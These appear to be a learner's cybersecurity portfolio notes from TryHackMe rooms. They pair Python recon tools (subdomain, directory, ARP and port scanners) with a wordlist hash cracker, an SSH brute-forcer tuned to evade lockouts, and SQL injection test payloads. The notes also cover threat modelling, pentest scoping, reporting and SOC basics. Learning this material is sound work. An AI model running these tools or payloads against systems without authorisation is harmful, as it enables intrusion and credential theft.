docs.title: Task 2 — Subdomain and Directory Enumeration
docs.text:
import requests

def enumerate_subdomains(domain, wordlist_path):
    found = []
    with open(wordlist_path) as f:
        subdomains = [line.strip() for line in f]

    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            r = requests.get(url, timeout=2)
            if r.status_code < 404:
                print(f"[FOUND] {url} ({r.status_code})")
                found.append(url)
        except requests.exceptions.ConnectionError:
            pass
    return found

def enumerate_directories(base_url, wordlist_path):
    found = []
    with open(wordlist_path) as f:
        paths = [line.strip() for line in f]

    for path in paths:
        url = f"{base_url}/{path}"
        try:
            r = requests.get(url, timeout=2)
            if r.status_code not in [404, 400]:
                print(f"[{r.status_code}] {url}")
                found.append((url, r.status_code))
        except:
            pass
    return found

What this replaces manually: This is what gobuster dir and ffuf do — but built from scratch. Understanding the underlying HTTP request loop makes me a better user of those tools and enables custom filtering they don't support out of the box.

docs.title: Task 3 — Network Discovery with ARP Scanning (Scapy)
docs.text:
from scapy.all import ARP, Ether, srp

def arp_scan(network_range):
    """Discover live hosts on a local network using ARP."""
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=3, verbose=0)[0]

    hosts = []
    for sent, received in result:
        hosts.append({
            "ip": received.psrc,
            "mac": received.hwsrc
        })
        print(f"IP: {received.psrc}  MAC: {received.hwsrc}")

    return hosts

# Scan the local network
live_hosts = arp_scan("192.168.1.0/24")
print(f"\nFound {len(live_hosts)} live hosts")

What this replaces: The equivalent of nmap -PR -sn 192.168.1.0/24 — but written in Python using Scapy's packet crafting directly. This demonstrates understanding of how ARP works at the packet level, not just running a tool command.

docs.title: Task 4 — Port Scanning with Sockets
docs.text:
import socket
import threading
from datetime import datetime

open_ports = []
lock = threading.Lock()

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            try:
                banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            except:
                banner = ""
            with lock:
                open_ports.append((port, banner))
                print(f"[OPEN] Port {port}: {banner}")
        sock.close()
    except:
        pass

def threaded_scan(ip, start_port, end_port, thread_count=100):
    print(f"Scanning {ip} ports {start_port}-{end_port}")
    print(f"Started: {datetime.now()}\n")

    threads = []
    for port in range(start_port, end_port + 1):
        t = threading.Thread(target=scan_port, args=(ip, port))
        threads.append(t)
        t.start()

        # Control thread count
        if len(threads) >= thread_count:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    print(f"\nScan complete: {datetime.now()}")
    print(f"Open ports: {[p[0] for p in open_ports]}")

Key concept — threading: Without threading, scanning 1000 ports with a 1-second timeout each takes 1000 seconds. With 100 threads running simultaneously, it takes ~10 seconds. This is the same reason Nmap uses parallel scanning.

docs.title: Task 5 — Automating Downloads and Data Retrieval
docs.text:
import requests
import os

def download_file(url, save_path):
    """Download a file from a URL, streaming large files."""
    try:
        r = requests.get(url, stream=True, timeout=10)
        r.raise_for_status()

        with open(save_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

        print(f"Downloaded: {save_path}")
        return True
    except Exception as e:
        print(f"Failed: {e}")
        return False

def fetch_api_data(url, headers=None, params=None):
    """Query an API endpoint and return parsed JSON."""
    try:
        r = requests.get(url, headers=headers, params=params, timeout=5)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.JSONDecodeError:
        return r.text
    except Exception as e:
        print(f"API error: {e}")
        return None

Security application: Automating HTTP requests is the foundation of web vulnerability testing — every automated scanner is essentially a loop of requests.get() or requests.post() calls with result analysis.

docs.title: Task 6 — Hash Cracking with hashlib
docs.text:
import hashlib

def crack_hash(target_hash, wordlist_path, algorithm="md5"):
    """Dictionary attack against a hash."""
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            word = line.strip()
            if not word:
                continue

            # Hash the candidate
            h = hashlib.new(algorithm)
            h.update(word.encode("utf-8"))
            candidate_hash = h.hexdigest()

            if candidate_hash == target_hash:
                print(f"[CRACKED] {target_hash} = {word}")
                return word

    print("Not found in wordlist")
    return None

# Example — crack an MD5 hash
crack_hash(
    "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5 of "password"
    "/usr/share/wordlists/rockyou.txt",
    "md5"
)

# Supported algorithms
print(hashlib.algorithms_available)
# → md5, sha1, sha256, sha512, blake2b, ...

What this demonstrates: This is exactly what Hashcat does in dictionary mode — hash each word from the wordlist and compare against the target. Understanding this confirms why salted hashes are necessary: without a salt, identical passwords produce identical hashes, making precomputed rainbow table attacks possible.

docs.title: Task 7 — SSH Brute Forcing with Paramiko
docs.text:
import paramiko
import time

def ssh_brute_force(host, username, wordlist_path, port=22, delay=0.5):
    """Test SSH credentials from a wordlist."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_path) as f:
        passwords = [line.strip() for line in f]

    for password in passwords:
        try:
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=3,
                banner_timeout=3
            )
            print(f"[SUCCESS] {username}:{password}")
            client.close()
            return password

        except paramiko.AuthenticationException:
            print(f"[FAIL] {password}")
        except Exception as e:
            print(f"[ERROR] {e}")
            break

        time.sleep(delay)   # rate limiting — avoid lockouts

    return None

Important: This is the Python equivalent of hydra -l username -P wordlist ssh://host. The time.sleep(delay) is critical — without rate limiting, rapid attempts trigger account lockout, defeating the attack and alerting the target.

Combined all previous scripts into a single command-line tool:

import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="Mini Recon Toolkit")
    subparsers = parser.add_subparsers(dest="command")

    # Subdomain scan
    sub = subparsers.add_parser("subdomains")
    sub.add_argument("domain")
    sub.add_argument("-w", "--wordlist", default="subdomains.txt")

    # Port scan
    ports = subparsers.add_parser("portscan")
    ports.add_argument("target")
    ports.add_argument("-p", "--ports", default="1-1000")

    # Directory enum
    dirs = subparsers.add_parser("dirscan")
    dirs.add_argument("url")
    dirs.add_argument("-w", "--wordlist", default="common.txt")

    args = parser.parse_args()

    if args.command == "subdomains":
        enumerate_subdomains(args.domain, args.wordlist)
    elif args.command == "portscan":
        start, end = map(int, args.ports.split("-"))
        threaded_scan(args.target, start, end)
    elif args.command == "dirscan":
        enumerate_directories(args.url, args.wordlist)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()

# Usage
python toolkit.py subdomains target.com -w wordlist.txt
python toolkit.py portscan 10.10.10.1 -p 1-1000
python toolkit.py dirscan http://target.com -w common.txt

docs.title: Key Takeaways
docs.text:
• Threading is essential for speed — a sequential port scanner is unusable; a threaded one is practical. Understanding threading unlocks serious tool building
  • requests + file I/O is the pattern for almost every web security tool — load wordlist, loop, send request, check response, save result
  • hashlib confirms how hash cracking works at the algorithm level — not just "Hashcat does it" but why identical passwords without salts are dangerous
  • Paramiko enables Python-native SSH interaction — the same library used in many real-world pentesting frameworks
  • argparse makes tools professional — a toolkit without CLI arguments is a script; one with --target, --wordlist, --port is a tool

docs.title: Overview
docs.text: Field Details Room Threat Modeling for Pentesters Path Jr Penetration Tester → Pentesting Methodologies and Reporting Tasks Task 1 — Task 9 (all, 100%)

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 Four Questions and Three Frameworks Task 3 The Building Blocks: Assets, Data Flows, and Trust Boundaries Task 4 STRIDE: Systematic Threat Identification Task 5 Scoring Threats with DREAD Task 6 PASTA: Risk-Centric Threat Modeling Task 7 MITRE ATT&CK for Threat Modeling Task 8 Putting It All Together: Threat Modeling Stratford Systems Task 9 Conclusion

docs.title: What is Threat Modeling?
docs.text: Threat modeling is the structured process of identifying what could go wrong in a system before testing or building it — answering what needs protecting, what could attack it, and how to prioritise defences.

docs.title: The Four Questions (Adam Shostack's framework)
docs.text:
1. What are we building?        → System architecture, assets, data flows
2. What can go wrong?           → Threat identification
3. What are we going to do about it?  → Mitigations and controls
4. Did we do a good job?        → Validation and review

docs.title: Task 3 — Building Blocks
docs.text:
Concept Definition Assets What needs protecting — data, credentials, systems, reputation Data flows How information moves between components Trust boundaries Points where data crosses between different privilege/trust levels (e.g. internet → DMZ → internal network)

Why trust boundaries matter for pentesting: Vulnerabilities cluster at trust boundaries — anywhere untrusted input crosses into a trusted zone is where validation failures live.

docs.title: Task 4 — STRIDE
docs.text:
A systematic checklist for identifying threats, one category at a time, against each component of a system.

Letter Threat Maps to S Spoofing Authentication failures T Tampering Data integrity attacks R Repudiation Lack of logging/non-repudiation I Information Disclosure Data exposure, leaks D Denial of Service Availability attacks E Elevation of Privilege Authorisation failures

Practical use: Walk through each component of the architecture and ask "Could STRIDE category X happen here?" — six questions per component, systematically covering the attack surface.

docs.title: Task 5 — DREAD Scoring
docs.text:
Once a threat is identified, DREAD scores its severity (each scored 1-10, then averaged):

Letter Question Damage How bad is the impact if exploited? Reproducibility How easily can it be reproduced? Exploitability How much skill/effort is needed? Affected users How many users are impacted? Discoverability How easily can an attacker find it?

Why this matters for reporting: DREAD gives a consistent, defensible number instead of a gut-feeling "High/Medium/Low" — useful when justifying risk ratings to clients.

docs.title: Task 6 — PASTA (Process for Attack Simulation and Threat Analysis)
docs.text:
A risk-centric, business-aligned threat modeling methodology — 7 stages from business objectives down to actual attack simulation.

1. Define business objectives
2. Define technical scope
3. Application decomposition
4. Threat analysis
5. Vulnerability analysis
6. Attack modeling/simulation
7. Risk and impact analysis

Difference from STRIDE: STRIDE is component-by-component and technical; PASTA starts from business risk and works down to technical findings — better suited for executive-level reporting.

docs.title: Task 7 — MITRE ATT&CK for Threat Modeling
docs.text:
Connects threat modeling theory to real-world observed attacker behaviour. Instead of asking "what could theoretically go wrong," ATT&CK asks "what have real attackers actually done in similar systems?"

Practical integration: Map identified threats to specific ATT&CK techniques (e.g. a spoofing threat → T1078 Valid Accounts) to ground the model in documented reality rather than pure theory.

docs.title: Task 8 — Putting It All Together
docs.text:
Applied the full process against a sample system ("Stratford Systems"):

1. Mapped architecture — identified assets, data flows, trust boundaries
2. Ran STRIDE against each component
3. Scored each identified threat with DREAD
4. Prioritised based on DREAD scores
5. Mapped top threats to MITRE ATT&CK techniques for realism check

docs.title: Key Takeaways
docs.text:
• Threat modeling happens before exploitation — it tells you where to focus pentest effort, not just what to test randomly
  • STRIDE gives systematic coverage — six categories per component prevents missing entire threat classes
  • DREAD makes severity defensible — numeric scoring beats subjective High/Medium/Low when justifying findings to clients
  • PASTA bridges technical findings to business risk — useful when the audience is executives, not engineers
  • ATT&CK grounds theory in reality — connecting a theoretical threat to documented real-world attacker behaviour strengthens any report

docs.title: Overview
docs.text: Field Details Room Planning and Scoping Path Jr Penetration Tester → Pentesting Methodologies and Reporting Tasks Task 1 — Task 9 (all, 100%)

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 What is Penetration Testing? Task 3 Types and Approaches Task 4 Defining the Scope Task 5 Pre-Engagement and Legal Foundations Task 6 Rules of Engagement Task 7 Regulatory Compliance Task 8 Putting It All Together Task 9 Conclusion

docs.title: Task 3 — Types and Approaches
docs.text: Type What's tested Knowledge level Black box Tester has no prior knowledge — simulates external attacker None White box Full access to source code, architecture, credentials Full Grey box Partial knowledge — typical real-world engagement Partial Approach Focus Network pentest Infrastructure, firewalls, servers Web app pentest Applications, APIs Social engineering People Physical pentest Buildings, access controls Red team Full-scope, objective-based, evasive — tests detection/response, not just vulnerabilities

docs.title: Task 4 — Defining the Scope
docs.text:
Scope is the single most legally important document in a pentest engagement.

What scope must define: 

- Exact IP ranges / domains / applications in scope
- Explicitly excluded systems (third-party, production-critical)
- Testing window (dates and times)
- Allowed techniques (DoS allowed? Social engineering allowed?)
- Emergency contact and escalation process

Why scope discipline matters: Testing outside agreed scope — even accidentally — is a criminal offence in most jurisdictions, regardless of intent.

docs.title: Task 5 — Pre-Engagement and Legal Foundations
docs.text:
Document Purpose Contract / SOW (Statement of Work) Defines deliverables, timeline, payment NDA Protects confidential information discovered during testing Authorisation letter Written, signed permission to test — the single most important document Liability and indemnity clauses Protects the tester if something goes wrong within agreed scope

Rule: No written authorisation = no legal pentest, regardless of verbal agreement.

docs.title: Task 6 — Rules of Engagement (ROE)
docs.text:
Defines exactly how testing will be conducted:

- Testing hours (business hours only? 24/7?)
- Notification requirements (alert SOC before testing? Or test their detection?)
- Data handling (what happens to data accessed during testing)
- Communication protocol (how/when to report critical findings immediately)
- Stop conditions (what triggers an immediate halt to testing)

Critical findings protocol: Most ROEs require immediate notification (not waiting for the final report) if a critical vulnerability with active exploitation risk is found — e.g. live ransomware, exposed customer PII actively accessible.

docs.title: Task 7 — Regulatory Compliance
docs.text:
Different industries require pentesting to satisfy specific regulations:

Regulation Industry Region PCI DSS Payment card processing Global HIPAA Healthcare USA GDPR Data protection EU (affects anyone processing EU data) SBP frameworks Banking Pakistan

Relevance: Compliance-driven pentests have specific scope and reporting requirements dictated by the regulation itself, not just the client's preference.

docs.title: Task 8 — Putting It All Together
docs.text:
Combined the full pre-engagement workflow:

1. Define pentest type (black/grey/white box) and approach (web/network/etc.)
2. Negotiate and document exact scope
3. Sign contract, NDA, and authorisation letter
4. Agree Rules of Engagement — testing hours, stop conditions, escalation
5. Identify any regulatory compliance requirements affecting scope/reporting
6. Only then — begin technical testing

docs.title: Key Takeaways
docs.text:
• Scope and authorisation come before any technical work — this room reinforced that planning is not bureaucracy, it's the legal boundary of the entire profession
  • Grey box is the most common real-world engagement type — pure black box is rare; clients usually provide some context to make testing efficient
  • ROE defines behaviour, scope defines targets — both documents serve different purposes and both are required
  • Regulatory compliance shapes the entire engagement — a PCI DSS-driven pentest has different requirements than a general security assessment

docs.title: Overview
docs.text: Field Details Room Writing Pentest Reports Path Jr Penetration Tester → Pentesting Methodologies and Reporting Tasks Task 1 — Task 7 (all, 100%)

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 The Anatomy of a Pentest Report Task 3 Report Section 1: Summary Task 4 Report Section 2: Vulnerability Write-Ups Task 5 Report Section 3: Appendices Task 6 Styling Guides and Report QA Task 7 Conclusion

docs.title: Why This Room Matters
docs.text: A pentest is only as valuable as its report. Clients act on the report, not on the testing itself. A technically brilliant test with a poor report delivers far less value than a thorough, well-communicated average test.

docs.title: Task 2 — Anatomy of a Pentest Report
docs.text:
1. Executive Summary       → for non-technical stakeholders
2. Scope and Methodology   → what was tested, how
3. Findings Summary        → table of all vulnerabilities by severity
4. Detailed Vulnerability Write-Ups  → technical depth, per finding
5. Appendices              → raw scan output, tool logs, evidence

docs.title: Task 3 — Executive Summary
docs.text:
Written for executives and decision-makers, not technical staff. No CVE IDs, no payload syntax — business risk in plain language.

Good executive summary:

"The assessment identified a critical vulnerability that would allow an attacker to access all customer payment records without authentication. We recommend immediate remediation before the next compliance audit."

Bad executive summary:

"SQL injection found in /api/v2/users via the id parameter using UNION-based extraction, CVSS 9.8."

Key principle: Translate technical severity into business impact — what could actually happen, to whom, and how urgently it needs fixing.

docs.title: Task 4 — Vulnerability Write-Ups
docs.text:
Each finding needs a consistent, complete structure:

- Title: clear, descriptive (not just "SQL Injection")
- Severity: Critical / High / Medium / Low / Informational (with CVSS score)
- Description: what the vulnerability is, in plain terms
- Impact: what an attacker could actually do with it
- Steps to Reproduce: exact, numbered steps — must be reproducible by someone else
- Evidence: screenshots, request/response pairs
- Remediation: specific, actionable fix — not just "patch the system"
- References: CVE, OWASP link, CWE ID

Critical rule: Steps to reproduce must be precise enough that someone with zero context could follow them and get the same result. Vague steps make findings undefendable if challenged.

docs.title: Task 5 — Appendices
docs.text:
Supporting material that doesn't belong in the main narrative but proves the work was done:

- Full Nmap scan output
- Complete tool logs (Burp, sqlmap, etc.)
- Raw HTTP requests/responses for every finding
- Methodology checklist showing what was tested (including negative results)

Why negative results matter: Documenting what was tested and found NOT vulnerable shows thoroughness and gives the client confidence the assessment was comprehensive, not just a list of lucky finds.

docs.title: Task 6 — Styling Guides and Report QA
docs.text: Practice Why it matters Consistent severity scale Same CVSS methodology used throughout — no mixing systems Spell-check and proofread Typos undermine credibility on a document meant to demonstrate rigour Consistent terminology Don't call the same vuln "SQLi" in one place and "SQL Injection" in another Peer review before delivery A second reviewer catches errors and gaps the original tester misses Redact sensitive data Real credentials/PII found during testing should be redacted in the report itself

docs.title: Key Takeaways
docs.text:
• The report is the deliverable, not the testing — clients pay for and act on the document, not the hours spent hacking
  • Executive Summary and technical findings serve different audiences — both must exist, written in genuinely different registers
  • Reproducibility is non-negotiable — a finding that can't be independently reproduced from your steps will be challenged or dismissed
  • Remediation advice must be specific — "fix the vulnerability" is useless; "implement parameterised queries using prepared statements" is actionable
  • QA matters as much as technical accuracy — a report full of typos undermines trust in technically sound findings

Part of my 6-month cybersecurity portfolio — github.com/shehrozmajeed

docs.title: Overview
docs.text: Field Details Room Re-Testing Path Jr Penetration Tester → Pentesting Methodologies and Reporting Tasks Task 1 — Task 8 (all, 100%)

docs.title: Tasks Completed
docs.text: Task Topic Task 1 Introduction Task 2 Re-Testing vs. Full Reassessment Task 3 Scoping the Re-Test Engagement Task 4 Pass, Fail, and Everything Between Task 5 Common Pitfalls in Re-Testing Task 6 Verifying the SQLi Fix Task 7 Evidence Collection and the Re-Test Report Task 8 Conclusion

docs.title: Why This Room Matters
docs.text: After a pentest report is delivered, the client fixes the issues — but findings are only closed once verified. Re-testing is the final, often overlooked step of the full engagement lifecycle.

docs.title: Task 2 — Re-Testing vs. Full Reassessment
docs.text: Re-Testing Full Reassessment Scope Only the specific findings from the original report Entire application/system again Time Hours to a few days Same length as original engagement Goal Confirm fixes work, didn't break anything else Comprehensive fresh assessment When used Standard practice after remediation New major release, annual compliance cycle

docs.title: Task 3 — Scoping the Re-Test Engagement
docs.text:
- Exact list of original findings to verify (with reference IDs)
- Confirmation of which fixes have actually been deployed
- Environment confirmation — is re-test happening in the same environment as original test?
- Timeline for verification

Common scoping issue: Client claims a fix is deployed in production, but it's only in staging. Always confirm the environment before re-testing.

docs.title: Task 4 — Pass, Fail, and Everything Between
docs.text:
Re-test results aren't always a clean binary:

Result Meaning Pass / Remediated Original vulnerability confirmed fixed Fail / Not Remediated Vulnerability still exploitable as originally found Partially Remediated Some attack vectors fixed, others remain (e.g. one parameter fixed, another still vulnerable to the same SQLi) New Issue Introduced The fix itself created a different vulnerability

Partial remediation is the most common real-world outcome — developers often patch the exact reported case without fixing the underlying root cause across all instances.

docs.title: Task 5 — Common Pitfalls in Re-Testing
docs.text:
- Assuming a fix works without actually re-testing every attack vector from the original finding
- Testing in the wrong environment (staging vs production)
- Not checking if the fix introduced a new vulnerability
- Insufficient time allocated — re-testing rushed because it's seen as "just a formality"
- Not re-verifying related/similar parameters that weren't explicitly in the original finding

docs.title: Task 6 — Verifying the SQLi Fix
docs.text:
Practical example: re-testing a previously identified SQL injection finding.

1. Retrieve original finding: parameter, payload, exact steps to reproduce
2. Re-run the exact original payload:
   ?id=1' OR '1'='1
3. Observe: error message? Different response? Same vulnerable behaviour?
4. If blocked — test variations to confirm it's not just the exact payload blocked:
   ?id=1' OR 1=1--
   ?id=1 UNION SELECT NULL--
5. Test the fix didn't break legitimate functionality:
   ?id=1   → still returns correct legitimate data?
6. Document: Pass/Fail with evidence for each variation tested

What I learned: Re-testing the exact original payload alone is insufficient — a naive fix might just blacklist that specific string. Testing variations of the same vulnerability class confirms the fix addresses the root cause, not just the literal reported payload.

docs.title: Task 7 — Evidence Collection and the Re-Test Report
docs.text:
Re-test reports are shorter than original reports but still require full evidence:

- Original finding reference
- Re-test date and tester
- Status: Pass / Fail / Partial
- Evidence: screenshot or request/response showing current behaviour
- If Fail: updated steps to reproduce reflecting current state
- If Partial: clearly document which vectors are fixed and which remain

docs.title: Key Takeaways
docs.text:
• Re-testing closes the loop — a pentest engagement isn't complete until findings are verified as fixed, not just reported
  • Partial remediation is common and must be called out explicitly — silently marking a finding "Pass" when only one of several vectors was fixed misrepresents the actual risk
  • Always test payload variations, not just the original exact string — confirms the fix addresses the vulnerability class, not just the specific reported instance
  • Environment confirmation is a scoping requirement — verifying a fix in staging when production is unpatched gives a false sense of security
  • Re-test reports still need evidence — shorter than the original report, but no less rigorous

Part of my 6-month cybersecurity portfolio — github.com/shehrozmajeed

docs.title: ⚡ SOC Level 1 Notes
docs.text: This section contains learning notes, key concepts, commands, and methodologies from the SOC Level 1 path.

docs.title: 📚 Modules Covered
docs.text:
Here is the list of topics and chapters covered:

  • Blue Team Intro: Junior Security Analyst Introduction, SOC Role in Blue Team, Humans as Attack Vectors, and Systems as Attack Vectors.

Use the left sidebar or the search bar above to navigate to any specific topic.

docs.title: Room 01 — Junior Security Analyst Intro
docs.text:
Path: SOC Level 1 → Blue Team Introduction Platform: TryHackMe

Personal study notes and reflection. Not a reproduction of the room's proprietary content — flags and identifiers are masked/generalized.

docs.title: Overview
docs.text: An introduction to the Junior Security Analyst (SOC L1) role — what the job actually looks like day to day inside a 24/7 Security Operations Center.

docs.title: The Threat Landscape
docs.text: The starting point for the role: organizations face a constant stream of threats — DDoS attacks, nation-state campaigns against critical infrastructure, supply chain compromises, SaaS data breaches. Every organization is a target; the SOC L1 analyst's job is making sure their org isn't the next headline.

docs.title: Responsibilities Covered
docs.text:
• Monitoring security alerts
  • Investigating suspicious activity
  • Escalating incidents to senior team members
  • Collaborating across teams
  • Continuously learning new threats and defenses

docs.title: SOC Team Structure (as modeled in the room)
docs.text: Role Responsibility Senior Analyst Handles complex investigations, supports L1 analysts SOC Engineer Maintains and configures security tools & alerting SOC Manager Oversees SOC operations, reports to leadership Incident Responder Steps in for major, escalated incidents

docs.title: Lab Reflection
docs.text:
Triaged a simulated SOC alert, identified a malicious external address (target_ip), and worked through the correct escalation path before taking firewall action.

Flag: THM{**********} (masked)

docs.title: Takeaways
docs.text:
• How L1 analysts triage and prioritize alerts
  • Why escalation procedures exist and matter
  • What a real incident response workflow looks like
  • Security is a team effort, not a solo one

Part of the SOC Level 1 learning series.

docs.title: Room 02 — SOC Role in Blue Team
docs.text:
Path: SOC Level 1 → Blue Team Introduction Platform: TryHackMe

Personal study notes and reflection. Not a reproduction of the room's proprietary content — flags and identifiers are masked/generalized.

docs.title: Overview
docs.text: Zooms out from the SOC itself to see how it fits into a company's wider security structure — leadership, team divisions, and career paths.

docs.title: Security Priorities Vary by Domain
docs.text: Different organizations weight security differently: law firms prioritize confidentiality, factories prioritize availability, hospitals prioritize safety and integrity. Context shapes what "secure" means.

docs.title: Security Leadership Hierarchy
docs.text:
• CEO — business strategy
  • CISO — owns cybersecurity strategy org-wide
  • Security teams — execute day-to-day operations

docs.title: Security Departments
docs.text: Team Focus 🔴 Red Team Offensive security, simulated attacks 🟢 GRC Team Governance, risk, regulatory compliance 🔵 Blue Team Defensive security — monitor, detect, respond

docs.title: SOC Roles
docs.text: L1 Analysts (triage) → L2 Analysts (deeper investigation) → SOC Engineers (SIEM/EDR, detection rules) → SOC Manager (oversight)

docs.title: CIRT — Cyber Incident Response Team
docs.text: The escalation point for major incidents — forensics, malware analysis, threat intel, high-pressure response. Effectively cybersecurity's "firefighting unit."

docs.title: Specialized Blue Team Roles
docs.text: As organizations grow, they add specialized roles that often evolve out of SOC experience: Digital Forensics Analyst, Threat Intelligence Analyst, AppSec Engineer, DevSecOps Engineer, AI Security Researcher.

docs.title: Internal SOC vs MSSP
docs.text: Feature Internal SOC MSSP Environment Single organization Multiple clients Workload Moderate High-pressure Tooling Deep, limited Broad, varied Learning curve Slower Faster exposure

docs.title: Career Path Mapped
docs.text: SOC L1 → SOC L2 → Specialized Roles (CIRT / Threat Intel / Engineering) → Leadership (Manager → CISO)

docs.title: Lab Reflection
docs.text:
Final challenge involved acting as CISO and assigning the right teams to handle multiple simultaneous incidents.

Flag: THM{**********} (masked)

docs.title: Takeaways
docs.text:
• Blue Team = defensive security; SOC = first line of defense
  • CIRT handles the critical, high-severity stuff
  • CISO is the top security decision-maker
  • The natural next step after L1 is L2 — not straight to specialization

Part of the SOC Level 1 learning series.

docs.title: Room 03 — Humans as Attack Vectors
docs.text:
Path: SOC Level 1 → Blue Team Introduction Platform: TryHackMe

Personal study notes and reflection. Not a reproduction of the room's proprietary content — flags and identifiers are masked/generalized.

docs.title: Overview
docs.text: Why people — not just systems — are the primary target for attackers, and how SOC analysts factor into defending the "human layer."

docs.title: Why Humans Get Targeted
docs.text: People are gatekeepers to valuable access — email, corporate systems, financial platforms, sensitive data. Compromising a person is often easier than compromising a system directly. Real-world goals include things like using a compromised HR account to steal employee data, or a compromised admin credential to gain VPN/network access.

docs.title: Social Engineering
docs.text:
A manipulation tactic built on psychology, not technical exploits. Effective because it's:

  • Trustworthy-looking — appears legitimate
  • Emotionally charged — urgency, fear, curiosity

docs.title: Common Attack Types Covered
docs.text:
• Phishing — the most common vector by volume; billions of phishing emails sent daily
  • Malware downloads — fake software, malicious sites, fake CAPTCHAs, often paired with SEO poisoning
  • Deepfakes — AI-generated audio/video impersonation used in real fraud cases (including multi-million dollar incidents)
  • Impersonation — fake IT staff, executives, or partners; many ransomware attacks start this way
  • Other vectors — USB drops, insider threats, fake job offers, physical access attacks

docs.title: Defense Model: Mitigation vs Detection
docs.text:
• Mitigation — prevent or reduce the likelihood of an attack succeeding
  • Detection — catch what slips past mitigation

Key mitigation measures: anti-phishing solutions, antivirus/EDR tools, a "trust but verify" culture, and security awareness training — arguably the strongest long-term defense of the group.

docs.title: SOC Analyst's Role
docs.text: Monitor phishing/malware alerts, investigate suspicious user activity, partner with IT/HR, help shape awareness programs. In some orgs, SOC analysts are also the point of contact when employees report something suspicious.

docs.title: Lab Reflection
docs.text:
Worked through identifying at-risk employees and shaping an appropriate security policy response.

Flags: THM{**********} and THM{**********} (masked)

docs.title: Takeaways
docs.text:
• Humans are the most common entry point, not just "the weakest link"
  • Attackers want access — social engineering is just the means
  • Security awareness training is one of the strongest long-term defenses
  • AI-driven threats (deepfakes) are raising the stakes

Part of the SOC Level 1 learning series.

docs.title: Room 04 — Systems as Attack Vectors
docs.text:
Path: SOC Level 1 → Blue Team Introduction Platform: TryHackMe

Personal study notes and reflection. Not a reproduction of the room's proprietary content — flags and identifiers are masked/generalized.

docs.title: Overview
docs.text: The counterpart to the human-focused room — how attackers get in even when people do everything right, by targeting weak or unpatched systems instead. Even a well-trained employee can't compensate for a weak lock on the gate.

docs.title: What Counts as a "System"
docs.text:
Any platform where data is stored or processed: physical servers, personal laptops, cloud platforms (e.g. Microsoft 365), web applications. Impact scales with what the system controls:

  • Compromised personal laptop → minor data theft
  • Compromised admin machine → full network access
  • Compromised mail server → thousands of accounts exposed
  • Compromised industrial system → entire operations disrupted

docs.title: How Systems Get Attacked
docs.text:
Human-led entry points — even system attacks often start with human mistakes: weak/reused passwords, pirated or malicious software, unknown USB devices. Roughly 81% of breaches involve compromised passwords.

Vulnerabilities — flaws in software that attackers can exploit. Thousands are discovered yearly and tracked via CVE (Common Vulnerabilities and Exposures) IDs. Zero-days are the worst case: found and exploited by attackers before defenders even know they exist.

Supply chain attacks — compromising trusted software or libraries to hit many organizations at once through a single point of entry (e.g. SolarWinds-style incidents). Dangerous because of blast radius, not sophistication.

Misconfigurations — human errors in setup rather than software flaws: weak default passwords, exposed databases, open access to critical systems. One of the most common real-world attack vectors.

docs.title: Remediation Model
docs.text: Problem Fix Vulnerability Patch (update the software; in the meantime, restrict access or apply vendor mitigations) Misconfiguration Reconfigure (fix the setup — a patch won't help)

docs.title: Proactive Defense Strategies
docs.text:
• Penetration testing — an authorized, simulated attack to find weaknesses
  • Vulnerability scanning — automated detection of flaws
  • Configuration audits — checking systems follow best practices

docs.title: System Protection Measures
docs.text: Patch management, IT security training (to reduce configuration mistakes), network access restrictions, antivirus/EDR solutions.

docs.title: SOC Analyst's Role
docs.text: Monitor system-level alerts, detect exploitation attempts, investigate suspicious activity, recommend remediation, work with IT — bridging detection and response.

docs.title: Lab Reflection
docs.text:
Analyzed a set of vulnerable systems and matched each one to the correct remediation strategy — patch vs. reconfigure.

Flags: THM{**********} and THM{**********} (masked)

docs.title: Takeaways
docs.text:
• Not every attack needs a human mistake — weak systems are enough on their own
  • Vulnerabilities and misconfigurations need different fixes, and mixing them up wastes response time
  • Supply chain attacks are dangerous because of blast radius, not sophistication
  • Strong defense = humans and systems, not either/or

Part of the SOC Level 1 learning series.

docs.title: Blue Team Introduction — Notes
docs.text: Path: SOC Level 1 → Blue Team Introduction Purpose: Quick-reference talking points for technical interviews covering SOC/Blue Team fundamentals.

docs.title: 1. What is Blue Team?
docs.text:
The defensive side of cybersecurity — responsible for monitoring, detecting, and responding to threats to protect an organization's systems, networks, and data.

  • Centers on prevention + detection + response
  • Defends against real attacks, as opposed to Red Team's simulated ones

docs.title: 2. What is a SOC?
docs.text:
A Security Operations Center (SOC) is a centralized team that monitors security alerts 24/7 and responds to potential threats.

  • Built around SIEM and EDR tooling
  • Works alerts as tickets through a defined workflow
  • The organization's first line of defense

docs.title: 3. SOC Roles
docs.text: Role Function L1 Analyst Alert monitoring & triage L2 Analyst Deeper investigation SOC Engineer Tool configuration & detection rules SOC Manager Team oversight & reporting

docs.title: 4. What Does a SOC Analyst Do Day to Day?
docs.text:
• Monitor alerts
  • Investigate suspicious activity
  • Escalate incidents
  • Document findings
  • Collaborate with IT/security teams

"We follow a triage → investigation → escalation workflow."

docs.title: 5. What is CIRT?
docs.text: The Cyber Incident Response Team handles major or critical incidents that exceed the SOC's scope — forensics, malware analysis, and containment.

docs.title: 6. Red Team vs. Blue Team
docs.text:
• Red Team — attacks; simulates real-world adversaries
  • Blue Team — defends; protects systems and data
  • Purple Team — the two working together

docs.title: 7. Why Are Humans a Common Target?
